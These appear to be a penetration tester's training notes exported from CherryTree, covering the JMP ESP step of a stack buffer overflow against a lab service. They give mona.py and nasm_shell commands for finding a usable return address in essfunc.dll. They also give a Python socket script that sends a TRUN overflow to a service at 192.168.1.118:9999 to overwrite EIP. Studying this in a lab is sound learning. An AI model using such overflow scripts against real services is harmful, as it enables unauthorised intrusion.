<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Find the right module for JMP ESP</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Find the right module for JMP ESP</h1><br/><br /><br />Now we need to find .dll or something similar inside a service that has not memory protections(ASLR, DEP, ...)<br /><br />• <span style="text-decoration:underline;">Immunity Debugger:</span> To find <span style="color:#ff0000;">JMP ESP</span> (or CALL ESP) in the application we can simply disassemble it(with Immunity Debugger or IDA) and then search for the instruction with CTRL+F.<br />    If we want to search the command in all the modules and libraries loaded by the program we have to select <strong>Search for →  All Commands in all modules</strong><br />   ◇ or with mona.py (include the bad char found in the chapter above):<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">!</span>mona jmp -r esp -cpb <span style="color:#3ad900;font-weight:400">&quot;\x00....&quot;</span></pre></div><br />    -cpb is used to ensure that the address of the instruction doesn&#39;t contain the bad chars \x00 <span style="text-decoration:underline;">and the others that we have found in the chapter before</span>.<br />    <a href=""><img src="images/2141-1.png" alt="images/2141-1.png" /></a><br /><br />• <span style="text-decoration:underline;">search modules with JMP ESP</span>:<br />    Link mona: <a href="https://raw.githubusercontent.com/corelan/mona/master/mona.py">https://raw.githubusercontent.com/corelan/mona/master/mona.py</a><br />    Download mona.py and place inside: “C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands”<br />   1) With the service running run:<br />       <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">!</span>mona modules</pre></div><br />       <a href=""><img src="images/2141-2.png" alt="images/2141-2.png" /></a><br />       We need to find a module with most of the protections disabled. In this example is <span style="color:#ff0000;">essfunc.dll</span><br />   2) Now we need to search a JMP ESP. To convert &quot;JMP ESP&quot; in hexadecimal we can use nasm_shell.<br />       <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>metasploit-framework<span style="color:#ff9d00;font-weight:700">/</span>tools<span style="color:#ff9d00;font-weight:700">/</span>exploit<span style="color:#ff9d00;font-weight:700">/</span>nasm_shell.rb<br />JMP ESP</pre></div><br />       <a href=""><img src="images/2141-3.png" alt="images/2141-3.png" /></a><br />       hexadecimal equivalent of the JMP ESP instruction which is \xFF\xE4<br />   3) Run in Immunity:<br />        <span style="color:#ff0000;">essfunc.dll</span> is the module found before without memory protection<br />        <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">!</span>mona <span style="color:#ff9d00;font-weight:700">find</span> -s <span style="color:#3ad900;font-weight:400">&quot;\xFF\xE4&quot;</span> -m essfunc.dll</pre></div><br />        <a href=""><img src="images/2141-4.png" alt="images/2141-4.png" /></a><br />        Now we need to use one of these address in the EIP that will jump to the ESP. <span style="text-decoration:underline;">This address cannot contain </span><a href="st_Methodology--Network_Pentest--Exploitation--Buffer_Overflow--Steps_to_conduct_a_Buffer_Overflow_(OSCP_&_eCPPT)--Finding_Bad_Characters.html">any of the bad characters</a>.<br />        Copy an address(example: 625011AF) that point to JMP ESP command and add it to the payload in hexadecimal and in a swapped order (\xAF\x11\x50\x62)<br />   4) Change the value of<br />   ◇ jmp_address → with the value found at point 3  <br />   ◇ eip_address_location → with the value found in the chapter “Find the Offset”<br />   ◇ s.connect → with address and port of the service<br />   ◇ s.send → with the value of the command of the service<br />    <div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#!/usr/bin/python</span><br />import socket<br />import sys<br />from time import <span style="color:#ff9d00;font-weight:700">sleep</span><br /><br />jmp_address = <span style="color:#3ad900;font-weight:400">&#39;\xAF\x11\x50\x62&#39;</span><br />eip_address_location = 2003<br />buffer = <span style="color:#3ad900;font-weight:400">&#39;A&#39;</span> * eip_address_location + jmp_address<br /><br />try<span style="color:#ff9d00;font-weight:700">:</span><br />  <span style="color:#7f0044;font-weight:400">s</span>=socket.socket<span style="color:#ff9d00;font-weight:700">(</span>socket.AF_INET,socket.SOCK_STREAM<span style="color:#ff9d00;font-weight:700">)</span><br />  s.settimeout<span style="color:#ff9d00;font-weight:700">(</span>2<span style="color:#ff9d00;font-weight:700">)</span><br />  s.connect<span style="color:#ff9d00;font-weight:700">((</span><span style="color:#3ad900;font-weight:400">&#39;192.168.1.118&#39;</span>,9999<span style="color:#ff9d00;font-weight:700">))</span><br />  s.recv<span style="color:#ff9d00;font-weight:700">(</span>1024<span style="color:#ff9d00;font-weight:700">)</span><br />  <br />  print <span style="color:#3ad900;font-weight:400">&#39;[*] Sending buffer.&#39;</span><br />  s.send<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&#39;TRUN /.:/&#39;</span> + buffer + <span style="color:#3ad900;font-weight:400">&#39;\r\n&#39;</span><span style="color:#ff9d00;font-weight:700">)</span>                <span style="color:#0088ff;font-weight:400">#target the TRUN command</span><br />  s.<span style="color:#ffdd00;font-weight:400">close()</span><br />  <br />except<span style="color:#ff9d00;font-weight:700">:</span><br />  print <span style="color:#3ad900;font-weight:400">&#39;[*] Could not connect to target, exiting.&#39;</span><br />  sys.<span style="color:#ffdd00;font-weight:400">exit()</span></pre></div><br />   5) In Immunity use “Go To address in Disassembler” <a href=""><img src="images/2141-5.png" alt="images/2141-5.png" /></a> and search for the address found at point 3<br />    <a href=""><img src="images/2141-6.png" alt="images/2141-6.png" /></a><br />    <a href=""><img src="images/2141-7.png" alt="images/2141-7.png" /></a><br />    and set a breakpoint on it with F2<br />    <a href=""><img src="images/2141-8.png" alt="images/2141-8.png" /></a><br />    In this way we can check if we overwrite the <strong><span style="color:#ffff00;">EIP</span></strong> with this address<br /><br />   6) Run the script of point 4<br />    Check on Immunity if it worked<br />    <a href=""><img src="images/2141-9.png" alt="images/2141-9.png" /></a><br />    YES! worked since we can see the jmp_address in the <span style="color:#ffff00;">EIP</span><br />       <br />       <br />      <br />       <br /></div>
</body>
</html>
